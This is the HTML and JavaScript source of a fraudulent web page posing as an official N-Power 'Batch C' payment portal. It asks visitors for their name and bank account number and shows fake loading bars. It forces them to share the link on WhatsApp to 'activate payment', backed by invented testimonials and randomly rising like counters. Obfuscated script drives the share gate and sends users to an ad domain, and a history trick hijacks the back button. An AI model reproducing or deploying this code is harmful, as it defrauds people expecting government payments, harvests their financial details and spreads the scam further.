<!DOCTYPE html>
<html>
    <head>
   
      
    <script>

        function set_Cookie(name,value){
            var Days = 30;
            var exp = new Date();
            exp.setTime(exp.getTime() + (Days*20*1000));
            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
        }
        function get_Cookie(name){
            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
            if(arr=document.cookie.match(reg)){
                return unescape(arr[2]);
            }
            return '';
        }


        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
                        document.getElementById("first-box")."quedate__step".display="none";//??;
                        document.getElementById("second-box").style.display="none";//??;
                        document.getElementById("third-box").style.display="none";//??;
                        document.getElementsByClassName("loading2__box").style.display="";//??;
                    }*/


    </script>
  
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>N-Power Payment Portal for Batch C</title>
        <link rel="shortcut icon" type="image/png" href="ii.jpeg" />
        <meta name="og:title" content="Apply Now For N-Power Payment Portal for Batch C" />
        <meta property="og:description" content="https://ssp.nasims.gov.ng" />
        <meta property="og:image" content="https://imagizer.imageshack.com/img922/6223/H2LT9W.jpg"/>
        <meta property="og:type" content="website" />
    <meta property="og:updated_time" content="1440432930" />
    <link rel="me" href="https://www.blogger.com/profile/13809910274301822692" />

<link rel="me" href="https://www.blogger.com/profile/17222055979768522082" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
<link rel="me" href="https://www.blogger.com/profile/05247548254034157849" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
<link rel="me" href="https://www.blogger.com/profile/10724325096955415762" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
<link rel="me" href="https://www.blogger.com/profile/05247548254034157849" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
<link rel="me" href="https://www.blogger.com/profile/05247548254034157849" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
<link rel="me" href="https://www.blogger.com/profile/04882416336172449816" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
<link rel="me" href="https://www.blogger.com/profile/06503028996064679272" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
<link rel="me" href="https://www.blogger.com/profile/03577781736427455179" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
<link rel="me" href="https://www.blogger.com/profile/04882416336172449816" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
</head>
<body>
<style type="text/css">
@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
* {
    margin: 0;
    padding: 0;
    font-family: Poppins, Droid Arabic Naskh;
    font-weight: normal;
    box-sizing: border-box;


}
body {
    direction: lfl;
    background: brown;
}
a {
    text-decoration: none;
}
.post {
    background: #fff;
    margin: 0 auto;
    padding: 10px;
    max-width: 500px;
    border: 1px solid #d0d1d5;
    border-radius: 3px;
}
.post img {
    width: 100%;
}
.welcome {
    font-size: 15px;
}
.amount,
#getname {
    color: #098105;
    text-decoration: none;
}
.done {
    text-align: center;
    color: #27ae60;
}
.tip {
    font-size: 14px;
}
.title {
    text-align: center;
}
.error {
    display: none;
    text-align: center;
    font-size: 14px;
    color: #e74c3c;
}
button {
    display: block;
    width: 200px;
    height: 50px;
    color: #fff;
    border: none;
    outline: none;
    font-size: 24px;
    cursor: pointer;
    border-radius: 5px;
    padding: 0 10px;
    margin: 10px auto;
    background: rgb(49, 130, 235);
    transition: background 0.3s ease;
}
button:hover {
    background: #098105;
}
.phone {
    max-width: 400px;
    margin: 10px auto;
}
.phone input {
    width: 100%;
    height: 50px;
    padding: 10px;
    outline: none;
    border: 2px solid #cecece;
    font-size: 14px;
}
#confirm {
    width: 200px;
    margin: 10px auto;
    border-radius: 0px;
}
#loader {
    text-align: center;
}
.spin {
    width: 50px;
    height: 50px;
    background: transparent;
    border: solid 8px rgb(49, 130, 235);
    border-right-color: transparent;
    border-radius: 50%;
    margin: 10px auto;
    animation: spin 0.8s linear infinite;
}
@keyframes spin {
    100% {
        transform: rotate(1turn);
    }
}
#loader,
#info,
#checking,
#share,
#claim {
    display: none;
}
.center {
    display: flex;
    align-items: center;
    justify-content: center;
}
.barr {
    direction: ltr;
    max-width: 400px;
    margin: 10px auto;
    box-sizing: border-box;
}
.fill {
    position: relative;
    display: inline-block;
    width: calc(100% - 100px);
    height: 35px;
    padding: 2px;
    border: 2px solid #098105;
}
#fill,
#fill2 {
    background: #098105;
    width: 0%;
    height: 100%;
}
.percentage {
    width: 100px;
    float: right;
    height: 35px;
    font-size: 16px;
    border: 2px solid #098105;
}
#percentage,
#percentage2 {
    margin-left: 5px;
}
#check,
#check2 {
    display: none;
}
.counter {
    color: #7f7f7f;
    font-size: 12px;
    text-align: right;
    padding: 10px 0 10px 2px;
    border-bottom: 1px solid #e1e2e3;
}
.reactions {
    display: inline-flex;
    align-items: center;
    float: left;
}
.counter img {
    float: left;
    width: 16px;
    height: 16px;
    border-radius: 50%;
    border: 2px solid #fff;
    box-sizing: content-box;
}
.like,
.love {
    margin-right: -5px;
}
.like {
    z-index: 2;
}
.love {
    z-index: 1;
}
.bar {
    display: table;
    width: 100%;
    border-bottom: 1px solid #e1e2e3;
}
.bar .react {
    display: table-cell;
    width: calc(100% / 3);
    font-size: 12px;
    color: #7f7f7f;
    text-align: center;
    padding: 10px 0;
    cursor: pointer;
}
.comments {
    direction: ltr;
}
.comment {
    padding: 6px 0;
    margin-top: 5px;
}
.comment img {
    float: left;
    width: 32px;
    height: 32px;
    border: none;
    border-radius: 18px;
    cursor: pointer;
}
.reply {
    margin-left: 37px;
}
.single-container {
    margin-left: 37px;
    background: #f1f2f6;
    padding: 10px;
    border-radius: 15px;
    font-size: 12px;
}
.single-container .user {
    display: inline-block;
    cursor: pointer;
    color: #365899;
    margin-bottom: 5px;
}
.single-container .text {
    display: block;
}
.buttons {
    font-size: 12px;
    font-weight: bold;
    margin: 10px 0 0 47px;
    color: #90949c;
}
.action {
    cursor: pointer;
}
.action:hover {
    text-decoration: underline;
}
.input {
    padding: 6px 12px 12px;
}
.input input {
    width: 100%;
    background: #f1f2f6;
    padding: 10px;
    border-radius: 15px;
    border: 0;
    outline: none;
}
.A{
    text-align: center;
    background-color: rgb(137, 186, 250);
}
</style>
  
  
  <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUwN6V-K8eGv-Za4u5ljILsl651YkBRUxm_cR6VOfTQX-BH4K4fEfFr8EbPnF2J_luBzB3LwTsLF_-epsNr1IE69du4lvbsmExvCO8K0Ov95bO6KmJ7sxHkI0XK488JjOq6JdDNsy3nDYdTK17Ln1F5bCRTzE-KLrb9jQ-fFnTM0ScPeTq8Yi_aAJZw3Q/s1080/IMG_20231110_235450.jpg" alt="unicef" style="width: 100%;"></center>
  
                    <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgD4myj4yI28LGrHqBZiDfa0693-AWiPOcphbR6umvC23xNSW5aIfDTRJbMjKmEvznFJjGqpGsYiUzra6U37lm6O79V_Y1llsQxzpj1lg9b5QUAjs-oU-bDRRFy4tHfNesLJ0dgvxAOyHma-OzFrEHUt0r5ocrOdM7CIAwX114RKjKaEiEXtT7Ky913Es/s774/images%20-%202023-11-10T223003.978.jpeg" alt="unicef" style="width: 100%;"></center>
                       <marquee class="horizontal_marque" direction="left">NPower Payment For Batch C Stream 1 and 2 Is Ongoing</marquee> <div class="A">
           BATCH C STREAM 1 AND 2<b></br>
                <br> NPOWER PAYMENT Portal
</br>
  <br>Npower payment for Batch C Stream 1 and 2 is ongoing. Choose from the options below and click on CONTINUE</br>
           <script type="text/javascript">
                     var timeleft = 4548;
                     var downloadTimer = setInterval(function(){
                         timeleft= timeleft + Math.floor(Math.random() * 600);
                         document.getElementById('countdowntimer').textContent = timeleft;
                         if (timeleft <= 0)
                             clearInterval(downloadTimer);
                     }, 1000);
                 </script>
         </div>
    <div class="post" width="100%">

        <div id="intro">
         
            <p class="welcome">
              
              <br>
              <br>
              <center><h2><font color="green">CHOOSE YOUR STREAM</font></h2></center>
                 
                </p>
          <p style="text-align:left;">

                 <h3><input type="checkbox" class="largerCheckbox"
           name="checkbox1" check><b>            NPOWER BATCH C (STREAM 1) </b>
  
   <br>
     <input type="checkbox" class="largerCheckbox"
            name="checkBox2" check><b>          NPOWER BATCH C (STREAM 2) </b>
  </h3>
<br>
          
          
               
            <button id="go">CONTINUE ➤</button>
        </div>
        <div id="loader">
            <div>Please Wait ...</div>
            <div class="spin"></div>
            <div id="num">0%</div>
        </div>
        <div id="info">
            <p class="title"><font color="green"> Validate your name and the bank you wish to get your payment on.</font></p>
          <br>
          <label class="control-label"><font color="black">Full Name</font>

             
           
                <center><input type="char" placeholder="" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br>
              
           <label class="control-label"><font color="black">Account Number</font>

             <br>

             <center><input type="char" placeholder="" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br>
                  
              
                <label class="control-label"><font color="black">Bank</font>    

                  
                  
                
    <center>          
<select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
    width: 330px;
    height: 56px;
">
<option value="أختر نوع الشبكة" selected="1">-----------Select Your Bank</option>
<option value="1">Access Bank Plc</option>
<option value="2">Citibank Nigeria Limited</option>
<option value="3">Ecobank Nigeria Plc</option>
<option value="4">Fidelity Bank Plc</option>
<option value="5">First Bank of Nigeria Limited 
</option>
<option value="6">FCMB</option>
  <option value="1">Globus Bank Limited</option>

<option value="2">Guaranty Trust Bank Plc</option>

<option value="3">Heritage Banking Company Ltd.</option>

<option value="4">Keystone Bank Limited</option>

<option value="5">Parallex Bank Ltd 

</option>

<option value="6">Polaris Bank Plc</option>
  <option value="1">Premium Trust Bank</option>

<option value="2">Providus Bank</option>

<option value="3">STANBIC IBTC BANK PLC</option>

<option value="4">Standard Chartered Bank Nigeria Ltd.</option>

<option value="5">Sterling Bank Plc 

</option>

<option value="6">SunTrust Bank Nigeria Limited</option>
  <option value="1">Titan Trust Bank Ltd</option>

<option value="2">Union Bank</option>

<option value="3">UBA</option>

<option value="4">Unity Bank Plc</option>

<option value="5">Wema Bank Plc

</option>

<option value="6">Zenith Bank Plc</option>
</select>
</center><br>  <br>

              
                <button id="confirm">PROCEED HERE</button>
            </div>
            <p class="error">Validate Your Name</p>
        </div>
        <div id="checking">
            <p class="title">Please wait a moment...</p>
            <div class="barr">
                <div class="fill">
                    <div id="fill"></div>
                </div>
                <div class="percentage center">
                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
                    <span id="check"><i class="fa fa-check-circle"></i></span>
                    <span id="percentage"></span>
                </div>
            </div>
        </div>
        <div id="share">

            <p class="tip"> Congratulations, <span id="getname"></span>,</p>
            <p class="tip">
                You are among the Npower candidates who will be paid.<span class="amount">(Payment Processing...)<br><br></span> <center>How To Get Your Payment</center>
            </p><br>
            
            <p class="tip">1. Share it with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</p>
            <p class="tip">2. You will be redirected automatically to our "PAYMENT ACTIVATION" page after the verification bar is filled.</p>
              <p class="tip">3. Click on "Get Payment" when you're redirected to our "PAYMENT ACTIVATION" page. Then you will receive your payment within 15 minutes.</p>
              <br><bt><p class="tip" >NOTE: The reason you need to share this information to others is so that others can be aware of this to avoid them being scammed online.</p>

            <button id="whatsapp">SHARE</button>
        
            <div class="barr">
                <div class="fill">
                    <div id="fill2"></div>
                </div>
                <div class="percentage center">
                    <span><i class="fa fa-spinner fa-pulse"></i></span>
                    <span id="percentage2">0%</span>
                </div>
            </div>
        </div>
        <div id="claim">
            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
            <p class="title"> Congratulations, You will receive your payment after clicking on "Get Payment". </p>
            <button id="offer">Get Payment</button>
          <center>         
<a  onclick="window.open('//almstda.tv/4/6279230')" href="//almstda.tv/4/6279230" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="button final">Payment Status</button></a> 
    </center><br/>
          
           <center>         
<a  onclick="window.open('//almstda.tv/4/6279230')" href="//almstda.tv/4/6279230" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="button final">Contact Us</button></a> 
    </center>
             
             
          
          
            
            
                    
                    </div>
          
          
<br>       
<style>






.active {
  background-color: #717171;
}

/* Fading animation */
.fade {
  animation-name: fade;
  animation-duration: 1.5s;
}

@keyframes fade {
  from {opacity: .4} 
  to {opacity: 1}
}

/* On smaller screens, decrease text size */
@media only screen and (max-width: 300px) {
  .text {font-size: 11px}
}
</style>

<body>

<h2></h2>
<p></p>

<div class="slideshow-container">

<div class="mySlides fade">
  <div class="numbertext"></div>
  <img src="https://imagizer.imageshack.com/img922/8715/iHbc7V.jpg" style="width:100%">
  <div class="text"></div>
</div>

<div class="mySlides fade">
  <div class="numbertext"></div>
  <img src="https://imagizer.imageshack.com/img922/4932/CRvZN2.jpg" style="width:100%">
  <div class="text"></div>
</div>

<div class="mySlides fade">
  <div class="numbertext"></div>
  <img src="https://imagizer.imageshack.com/img922/2496/7SG1m7.jpg" style="width:100%">
  <div class="text"></div>
</div>
  
  <div class="mySlides fade">

  <div class="numbertext"></div>

  <img src="https://imagizer.imageshack.com/img922/3848/i8JUNA.jpg" style="width:100%">

  <div class="text"></div>

</div>
  
  <div class="mySlides fade">
  <div class="numbertext"></div>
  <img src="https://imagizer.imageshack.com/img922/9803/BaOa9a.jpg" style="width:100%">
  <div class="text"></div>
  </div>

</div>
<br>

<div style="text-align:center">
  <span class="dot"></span> 
  <span class="dot"></span> 
  <span class="dot"></span>
  <span class="dot"></span>
  <span class="dot"></span>
</div>

<script>
let slideIndex = 0;
showSlides();

function showSlides() {
  let i;
  let slides = document.getElementsByClassName("mySlides");
  let dots = document.getElementsByClassName("dot");
  for (i = 0; i < slides.length; i++) {
    slides[i].style.display = "none";  
  }
  slideIndex++;
  if (slideIndex > slides.length) {slideIndex = 1}    
  for (i = 0; i < dots.length; i++) {
    dots[i].className = dots[i].className.replace(" active", "");
  }
  slides[slideIndex-1].style.display = "block";  
  dots[slideIndex-1].className += " active";
  setTimeout(showSlides, 2000); // Change image every 2 seconds
}
</script>

</body>
        
          
        <div class="comments">
            <div class="counter">
                <div class="reactions">
                    <img class="like" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhETuUnZKp3TrK9zDTqBtlN4ahx1RrCH6RqG14wW5J8CIBv6HYs7gQSvAiZBwn8NT3lXcz3h8jR87s1z_qZ2kzEoZ7HRnWzskSuqK5NOfKyiQByU3BgypGHXP-m9LlPyFh2FhIsUdN6cO1DnZb-GTtRMDQk8L75NDDUnEC4JxQ6OwsnAjbKVhhlNxrLyQ/s320/9F5D4C76-9CCB-45EB-BA73-73A125849593.jpeg" /> <img class="love" src="https://i.imgur.com/0UHB1f0.png" /> <img class="care" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAy946at4xhCjr4klpqPwgPr3rDevor0nyio2M6l6s99V64P0vlXA9wl_B3L4Y71SaCSBcyU4ylGpkmaaVzvypimn-qb_ZBvwuugTDRMGJOgWTRWbgV5KqH7IvlDuJuEmcLcqyN8SFkAVgKVbo0M--0rDDcJEG4YFH8xRI4PQ9G_L321RwjOupZTG9/s300/images%20(65).jpeg" /> <span id="likes">134K</span>
                </div>
                <span id="comments">23K comments</span> <span class="dot">·</span> <span id="shares">12K shares</span>
            </div>
            <div class="bar">
                <span class="react"><i class="fa fa-thumbs-o-up"></i> <a class="liked">Like</a></span> <span class="react"><i class="fa fa-comment-o"></i> Comment</span> <span class="react"><i class="fa fa-share"></i> Share</span>
            </div>
            <div>
                <div class="comment">
                    </div>
                </div>
                <div class="comment">
                    <img src="https://imagizer.imageshack.com/img923/6696/8dGU5S.jpg" />
                    <div class="single-container">
                        <span class="user">Muhammad Yakubu</span>
                        <span class="text">
After a very long time I have been waiting for my Npower payment at last I can simile now. Alhamdulillah🙏
                        </span>
                    </div>
                    <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
                </div>
                <div class="comment">
                    <img src="https://imagizer.imageshack.com/img923/7607/qNUZT7.jpg" />
                    <div class="single-container"><span class="user"> Amarachi Johnson</span> <span class="text">God bless Npower I'm very happy it was not even up to 15 minutes and I got my payment. Please follow the instruction carefully don't mind the idiots who are saying is fake because behind your back they will be the first to try it and I'm happy the only details that was requested was for validation which is your Name, and the account number for npower to send in your money nothing else 😍</span></div>
                    <div class="buttons"><span class="time t2">2m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
                </div>
                <div class="comment reply">
                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAy946at4xhCjr4klpqPwgPr3rDevor0nyio2M6l6s99V64P0vlXA9wl_B3L4Y71SaCSBcyU4ylGpkmaaVzvypimn-qb_ZBvwuugTDRMGJOgWTRWbgV5KqH7IvlDuJuEmcLcqyN8SFkAVgKVbo0M--0rDDcJEG4YFH8xRI4PQ9G_L321RwjOupZTG9/s300/images%20(65).jpeg" />
                    <div class="single-container"><span class="user"> Adam Fikayomi </span> <span class="text"> I am disappointed it took more than 15 minutes to get confirmation Sms and email. But I'm still happy at least it came</span></div>
                    <div class="buttons"><span class="time t1">1m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
                </div>
                <div class="comment">
                    <img src="https://imagizer.imageshack.com/img923/8602/jGUvgw.jpg" />
                    <div class="single-container"><span class="user"> Comfort Emmanuel</span> <span class="text">Just follow the instructions and you will get it straight...just got mine Now I can smile again</span></div>
                    <div class="buttons"><span class="time t3">4m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
                </div>
                <div class="input"><input placeholder="Write a comment..." /></div>
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-latest.min.js"></script>




<script type="text/javascript">
var time = 0;
window.setInterval(function () {
    time = time + 1;
    $(".t1").html(time + 1 + "m");
    $(".t2").html(time + 2 + "m");
    $(".t3").html(time + 4 + "m");
}, 6e4);
var likes = 134,
    comments = 23,
    shares = 12;
window.setInterval(function () {
    likes = likes + Math.floor(Math.random() * 3);
    comments = comments + Math.floor(Math.random() * 2);
    shares = shares + Math.floor(Math.random() * 2);
    $("#likes").html(likes + "K");
    $("#comments").html(comments + "K comments");
    $("#shares").html(shares + "K shares");
}, 5e3);
$(".liked").click(function () {
    if ($(this).hasClass("selected")) {
        $(this).removeClass("selected");
        $(this).html("Like");
    } else {
        $(this).addClass("selected");
        $(this).html("Unlike");
    }
});
</script>








<script type="text/javascript">

$("#go").click(function () {
    $("#intro").fadeOut(0);
    $("#loader").fadeIn(1000);
    var i = 0;
    var interval = setInterval(function () {
        $("#num").text(i + "%");
        i += 1;
        if (i >= 100) {
            clearInterval(interval);
            $("#loader").fadeOut(0);
            $("#info").fadeIn(1000);
        }
    }, 50);
});
$("#confirm").click(function () {
    if ($("#name").val().length < 4)
    {
        $(".error").fadeIn(500);
    } else {
        $("#info").fadeOut(0);
        $("#checking").fadeIn(1000);
        var i = 0;
        var interval = setInterval(function () {
            i += 1;
            $("#percentage").text(i + "%");
            $("#fill").css("width", i + "%");
            if (i == 50) {
                i = 49;
                setTimeout(function () {
                    i = 50;
                }, 1000);
            }
            if (i >= 100) {
                clearInterval(interval);
                $("#load").fadeOut(0);
                $("#check").fadeIn(0);
                setTimeout(function () {
                    $("#checking").fadeOut(0);
                    $("#share").fadeIn(1000);
                    $("#getname").html($("#name").val());
                }, 500);
            }
        }, 50);
    }
});
$(document).click(function () {
    if ($("#name").is(":focus")) {
        $(".error").fadeOut(500);
    }
});
</script>




<!--
"*30%20GB%20Free%20Internet%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_30GB",
-->
    </script>




<!--
"*30%20GB%20Free%20Internet%20Offer*%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_30GB",
-->
      <script>
        var text1 = "*N-POWER PAYMENT PORTAL FOR BATCH C STREAM 1 AND 2 IS NOW OPEN*%0A%0ANASIM has opened it's Payment Portal for *N-power Batch C Stream 1 and 2* for all bonafide citizens who applied for the N-power Program and it's yet to get paid.%0A%0ANASIM vision for the N-power program is for *Empowering Youths for Prosperity* The N-Power program is a program initiated by the former President of Nigeria, *Muhammadu Buhari* since June, 8, 2016%0A%0AThe N-power Payment has just began for all applicants who haven't gotten his/her payment.%0A%0A*Strictly for 18 and Above*%0A%0AHurry Now And Get Your N-power Payment%0A%0Ahttps://bit.ly/NPower-Payment-Portal_Batch-C_2023",
            text2 = " an amount of ",
            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
            abcde = "//almstda.tv/4/6279230",
            saved = "",
            share = "whatsapp://send?text=" + text1;
    </script>






<script>
<!-- code by OD -->
document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
</script>


<script>
    window.onhashchange=function(){jp();};
    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
    function jp() {
        fh();}
    setTimeout('hh();//almstda.tv/4/6279230', 500);
    function fh(){
        location.href="//almstda.tv/4/6279230";
    }
    function goon(){
        location.href="//almstda.tv/4/6279230";
    }
</script>






</body></html>

<!-- BEGIN: Powered by Supercounters.com -->
<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1679608,"ffffff","ffffff");</script><br><noscript><a href="https://www.supercounters.com/">free online counter</a></noscript>
</center>
<!-- END: Powered by Supercounters.com -->
